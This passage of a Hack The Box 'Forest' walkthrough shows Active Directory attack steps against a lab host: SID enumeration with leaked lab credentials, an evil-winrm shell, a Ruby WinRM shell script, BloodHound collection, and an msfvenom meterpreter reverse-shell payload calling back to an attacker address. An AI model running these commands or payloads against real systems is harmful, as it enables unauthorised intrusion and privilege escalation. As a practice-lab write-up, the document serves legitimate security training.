&lt;h2 id="ms14-068"&gt;MS14-068&lt;/h2&gt;
&lt;p&gt;In order to run MS14-068 we need the SUID of our user. We enumerate them using
metasploit. Our user SID is &lt;code&gt;S-1-5-21-3072663084-364016917-1341370565-1147&lt;/code&gt; (domain
SID-User RID).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 auxiliary(admin/kerberos/ms14_068_kerberos_checksum) &amp;gt; use auxiliary/scanner/smb/smb_lookupsid&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_lookupsid) &amp;gt; show options&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Module options (auxiliary/scanner/smb/smb_lookupsid):&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Name       Current Setting  Required  Description&lt;/span&gt;
&lt;span class="code-line"&gt;  ----       ---------------  --------  -----------&lt;/span&gt;
&lt;span class="code-line"&gt;  MaxRID     4000             no        Maximum RID to check&lt;/span&gt;
&lt;span class="code-line"&gt;  MinRID     500              no        Starting RID to check&lt;/span&gt;
&lt;span class="code-line"&gt;  RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;  SMBDomain  .                no        The Windows domain to use for authentication&lt;/span&gt;
&lt;span class="code-line"&gt;  SMBPass                     no        The password for the specified username&lt;/span&gt;
&lt;span class="code-line"&gt;  SMBUser                     no        The username to authenticate as&lt;/span&gt;
&lt;span class="code-line"&gt;  THREADS    1                yes       The number of concurrent threads&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Auxiliary action:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Name   Description&lt;/span&gt;
&lt;span class="code-line"&gt;  ----   -----------&lt;/span&gt;
&lt;span class="code-line"&gt;  LOCAL  Enumerate local accounts&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_lookupsid) &amp;gt; set RHOSTS 10.10.10.161&lt;/span&gt;
&lt;span class="code-line"&gt;RHOSTS =&amp;gt; 10.10.10.161&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_lookupsid) &amp;gt; set SMBDomain HTB.LOCAL&lt;/span&gt;
&lt;span class="code-line"&gt;SMBDomain =&amp;gt; HTB.LOCAL&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_lookupsid) &amp;gt; set SMBUser svc-alfresco&lt;/span&gt;
&lt;span class="code-line"&gt;SMBUser =&amp;gt; svc-alfresco&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_lookupsid) &amp;gt; set SMBPass s3rvice&lt;/span&gt;
&lt;span class="code-line"&gt;SMBPass =&amp;gt; s3rvice&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_lookupsid) &amp;gt; run&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - PIPE(LSARPC) LOCAL(HTB - 5-21-3072663084-364016917-1341370565) DOMAIN(HTB - 5-21-3072663084-364016917-1341370565)&lt;/span&gt;
&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - USER=Administrator RID=500&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - USER=lucinda RID=1146&lt;/span&gt;
&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - USER=svc-alfresco RID=1147&lt;/span&gt;
&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - GROUP=Service Accounts RID=1148&lt;/span&gt;
&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - GROUP=Privileged IT Accounts RID=1149&lt;/span&gt;
&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - USER=andy RID=1150&lt;/span&gt;
&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - USER=mark RID=1151&lt;/span&gt;
&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - USER=santi RID=1152&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can also try to get Users SPNs&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python GetUserSPNs.py -request htb.local/svc-alfresco:s3rvice&lt;/span&gt;
&lt;span class="code-line"&gt;Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;No entries found&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We add the DC to our &lt;code&gt;/etc/resolv.conf&lt;/code&gt; and install &lt;code&gt;rdate&lt;/code&gt; to have the same
time as the DC.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /etc/resolv.conf&lt;/span&gt;
&lt;span class="code-line"&gt;# Generated by NetworkManager&lt;/span&gt;
&lt;span class="code-line"&gt;search home&lt;/span&gt;
&lt;span class="code-line"&gt;nameserver 192.168.1.25&lt;/span&gt;
&lt;span class="code-line"&gt;domain htb.local&lt;/span&gt;
&lt;span class="code-line"&gt;search htb.local&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;apt-get install rdate&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;rdate -n htb.local&lt;/span&gt;
&lt;span class="code-line"&gt;Thu Oct 24 16:22:14 CEST 2019&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I know have the same time as the DC (this is super important for tickets
generation).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;date &amp;amp;&amp;amp; rdate -n htb.local&lt;/span&gt;
&lt;span class="code-line"&gt;Thu 24 Oct 2019 04:24:55 PM CEST&lt;/span&gt;
&lt;span class="code-line"&gt;Thu Oct 24 16:24:55 CEST 2019&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The exploitation of MS14-068 does not work.&lt;/p&gt;
&lt;h2 id="evil-winrm"&gt;Evil-winrm&lt;/h2&gt;
&lt;p&gt;As we so in the openport, the
&lt;a href="https://docs.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management"&gt;default port for winrm 5985&lt;/a&gt;
is open. We use &lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt; in order
to connect to the system and get user's flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&amp;gt; dir&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    Directory: C:\Users\svc-alfresco\Documents&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
&lt;span class="code-line"&gt;----                -------------         ------ ----&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   6:57 AM          12510 20191024065705_BloodHound.zip&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   8:23 AM           3996 Add-ACE.ps1&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   8:23 AM           2584 Add-ToGroup.ps1&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   6:28 AM          64384 Invoke-ACLPwn.ps1&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   8:02 AM        2661697 Invoke-Mimikatz.ps1&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   6:33 AM        1006744 mimikatz.exe&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   6:25 AM         212992 mp1.exe&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   9:17 AM          43696 nc64.exe&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   6:47 AM          73802 pd.exe&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   7:24 AM           6017 powerPriv.ps1&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   9:26 AM         363295 powerview.ps1&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   7:12 AM           8978 Rk9SRVNU.bin&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   6:27 AM         779264 SharpHound.exe&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   6:44 AM         919546 SharpHound.ps1&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   8:36 AM        2222592 SharpSploit.dll&lt;/span&gt;
&lt;span class="code-line"&gt;-a----       10/24/2019   7:26 AM          73802 shell.exe&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&amp;gt; cd ../&lt;/span&gt;
&lt;span class="code-line"&gt;di*Evil-WinRM* PS C:\Users\svc-alfresco&amp;gt; dir&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    Directory: C:\Users\svc-alfresco&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
&lt;span class="code-line"&gt;----                -------------         ------ ----&lt;/span&gt;
&lt;span class="code-line"&gt;d-r---        9/23/2019   2:16 PM                Desktop&lt;/span&gt;
&lt;span class="code-line"&gt;d-r---       10/24/2019   9:31 AM                Documents&lt;/span&gt;
&lt;span class="code-line"&gt;d-r---        7/16/2016   6:18 AM                Downloads&lt;/span&gt;
&lt;span class="code-line"&gt;d-r---        7/16/2016   6:18 AM                Favorites&lt;/span&gt;
&lt;span class="code-line"&gt;d-r---        7/16/2016   6:18 AM                Links&lt;/span&gt;
&lt;span class="code-line"&gt;d-r---        7/16/2016   6:18 AM                Music&lt;/span&gt;
&lt;span class="code-line"&gt;d-r---        7/16/2016   6:18 AM                Pictures&lt;/span&gt;
&lt;span class="code-line"&gt;d-----        7/16/2016   6:18 AM                Saved Games&lt;/span&gt;
&lt;span class="code-line"&gt;d-r---        7/16/2016   6:18 AM                Videos&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc-alfresco&amp;gt; dir Desktop&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    Directory: C:\Users\svc-alfresco\Desktop&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
&lt;span class="code-line"&gt;----                -------------         ------ ----&lt;/span&gt;
&lt;span class="code-line"&gt;-ar---        9/23/2019   2:16 PM             32 user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc-alfresco&amp;gt; type Desktop\user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;e5e4e&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
&lt;h2 id="evil-winrm-and-binary"&gt;evil-winrm and binary&lt;/h2&gt;
&lt;p&gt;Using evil-Winrm we can also check the domain SID (and our user SID):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;whoami /user&lt;/span&gt;
&lt;span class="code-line"&gt;USER INFORMATION&lt;/span&gt;
&lt;span class="code-line"&gt;----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User Name        SID&lt;/span&gt;
&lt;span class="code-line"&gt;================ =============================================&lt;/span&gt;
&lt;span class="code-line"&gt;htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Using evil-winrm we can easily upload a binary using the &lt;code&gt;upload&lt;/code&gt; function.
Nevertheless I was not able to invoke the binary using the &lt;code&gt;Invoke-binary&lt;/code&gt;
command. Therefore I used a simple ruby script to get on the machine a launch a
msfvenom meterprter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;require&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;winrm&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;WinRM&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="ss"&gt;endpoint&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://10.10.10.161:5985/wsman&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="ss"&gt;user&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;svc-alfresco&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="ss"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;s3rvice&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;:powershell&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;until&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;exit&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PS &amp;gt; &amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;gets&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="no"&gt;STDOUT&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="n"&gt;stdout&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="no"&gt;STDERR&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="n"&gt;stderr&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Exiting with code &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exitcode&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The msfvenom command to generate the meterpreter is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&amp;quot;10.10.15.185&amp;quot; LPORT=4444 -f exe &amp;gt; shell.exe&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;To catch the reverse meterpreter we use the &lt;code&gt;exploit/multi/handler&lt;/code&gt; metasploit
module. We can get a cmd shell using the &lt;code&gt;shell&lt;/code&gt; command.&lt;/p&gt;
&lt;h2 id="bloodhound"&gt;Bloodhound&lt;/h2&gt;
&lt;p&gt;As we need to elevate our privileges on a Windows environnement we want to run
Bloodhound to see the differents relationships between the domain's users,
groups and computers.
We use a &lt;a href="https://github.com/fox-it/BloodHound.py"&gt;bloodhound ingestor based on impacket&lt;/a&gt;
that allow to grab credentials remotly. But we get some error about DNS
resolution probably because of our VPN configuration.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python ./bloodhound.py -d &amp;#39;htb.local&amp;#39; -dc 10.10.10.161 -gc 10.10.10.161 -u svc-alfresco -p s3rvice -v -ns 10.10.10.161 -c all&lt;/span&gt;
&lt;span class="code-line"&gt;DEBUG: Authentication: username/password&lt;/span&gt;
&lt;span class="code-line"&gt;DEBUG: Resolved collection methods: localadmin, rdp, dcom, acl, objectprops, session, group, trusts&lt;/span&gt;
&lt;span class="code-line"&gt;DEBUG: Using DNS to retrieve domain information&lt;/span&gt;
&lt;span class="code-line"&gt;DEBUG: Querying domain controller information from DNS&lt;/span&gt;
&lt;span class="code-line"&gt;DEBUG: Using domain hint: htb.local&lt;/span&gt;
&lt;span class="code-line"&gt;INFO: Found AD domain: htb.local&lt;/span&gt;
&lt;span class="code-line"&gt;DEBUG: Found primary DC: FOREST.htb.local&lt;/span&gt;
&lt;span class="code-line"&gt;DEBUG: Found Global Catalog server: FOREST.htb.local&lt;/span&gt;
&lt;span class="code-line"&gt;DEBUG: Using LDAP server: 10.10.10.161&lt;/span&gt;
&lt;span class="code-line"&gt;DEBUG: Using base DN: DC=htb,DC=local&lt;/span&gt;
&lt;span class="code-line"&gt;INFO: Connecting to LDAP server: 10.10.10.161&lt;/span&gt;
&lt;span class="code-line"&gt;Traceback (most recent call last):&lt;/span&gt;
&lt;span class="code-line"&gt;  File &amp;quot;./bloodhound.py&amp;quot;, line 5, in &amp;lt;module&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    bloodhound.main()&lt;/span&gt;
&lt;span class="code-line"&gt;  File &amp;quot;/root/BloodHound.py/bloodhound/__init__.py&amp;quot;, line 265, in main&lt;/span&gt;
&lt;span class="code-line"&gt;    disable_pooling=args.disable_pooling)&lt;/span&gt;
&lt;span class="code-line"&gt;  File &amp;quot;/root/BloodHound.py/bloodhound/__init__.py&amp;quot;, line 68, in run&lt;/span&gt;
&lt;span class="code-line"&gt;    self.pdc.prefetch_info(&amp;#39;objectprops&amp;#39; in collect, &amp;#39;acl&amp;#39; in collect)&lt;/span&gt;
&lt;span class="code-line"&gt;  File &amp;quot;/root/BloodHound.py/bloodhound/ad/domain.py&amp;quot;, line 330, in prefetch_info&lt;/span&gt;
&lt;span class="code-line"&gt;    self.get_domains(acl=acls)&lt;/span&gt;
&lt;span class="code-line"&gt;  File &amp;quot;/root/BloodHound.py/bloodhound/ad/domain.py&amp;quot;, line 204, in get_domains&lt;/span&gt;
&lt;span class="code-line"&gt;    for entry in entries:&lt;/span&gt;
&lt;span class="code-line"&gt;  File &amp;quot;/root/BloodHound.py/bloodhound/ad/domain.py&amp;quot;, line 106, in search&lt;/span&gt;
&lt;span class="code-line"&gt;    self.ldap_connect()&lt;/span&gt;
&lt;span class="code-line"&gt;  File &amp;quot;/root/BloodHound.py/bloodhound/ad/domain.py&amp;quot;, line 60, in ldap_connect&lt;/span&gt;
&lt;span class="code-line"&gt;    q = self.ad.dnsresolver.query(self.hostname, tcp=self.ad.dns_tcp)&lt;/span&gt;
&lt;span class="code-line"&gt;  File &amp;quot;/usr/lib/python2.7/dist-packages/dns/resolver.py&amp;quot;, line 992, in query&lt;/span&gt;
&lt;span class="code-line"&gt;    timeout = self._compute_timeout(start, lifetime)&lt;/span&gt;
&lt;span class="code-line"&gt;  File &amp;quot;/usr/lib/python2.7/dist-packages/dns/resolver.py&amp;quot;, line 799, in _compute_timeout&lt;/span&gt;
&lt;span class="code-line"&gt;    raise Timeout(timeout=duration)&lt;/span&gt;
&lt;span class="code-line"&gt;dns.exception.Timeout: The DNS operation timed out after 3.0016040802 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We edit the code of &lt;code&gt;/root/BloodHound.py/bloodhound/ad/domain.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;ldap_connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;protocol&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ldap&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;resolver&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;        Connect to the LDAP service&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;logging&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Connecting to LDAP server: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hostname&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="c1"&gt;# Convert the hostname to an IP, this prevents ldap3 from doing it&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="c1"&gt;# which doesn&amp;#39;t use our custom nameservers&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="c1"&gt;#q = self.ad.dnsresolver.query(self.hostname, tcp=self.ad.dns_tcp)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="c1"&gt;#for r in q:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="c1"&gt;#ip = r.address&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;10.10.10.161&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The ingestor create a few JSON files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls *.json&lt;/span&gt;
&lt;span class="code-line"&gt;computers.json  domains.json  groups.json  sessions.json  users.json&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We start the &lt;code&gt;neo4j&lt;/code&gt; database, &lt;code&gt;bloodhound&lt;/code&gt; and feed him the JSON data.&lt;/p&gt;
&lt;p&gt;When using the query "Shortest Paths to High Value Targets" we get the following
graph:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Bloodhound complete view" src="/media/2020.03/forest_01.png"&gt;.&lt;/p&gt;
&lt;h2 id="exchange-trusted-subsystem-and-ntlmrelayx"&gt;Exchange trusted subsystem and ntlmrelayx&lt;/h2&gt;
&lt;p&gt;Our &lt;code&gt;svc-alfresco&lt;/code&gt; user got indirect right for the &lt;code&gt;Exchange trusted subsytem&lt;/code&gt;
group.
For more information about the Active Directory Right:
&lt;a href="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights"&gt;Documentation Microsoft&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Therefore we want to exploit our Exchange rights using
&lt;a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/"&gt;PrivExchange&lt;/a&gt;.&lt;/p&gt;
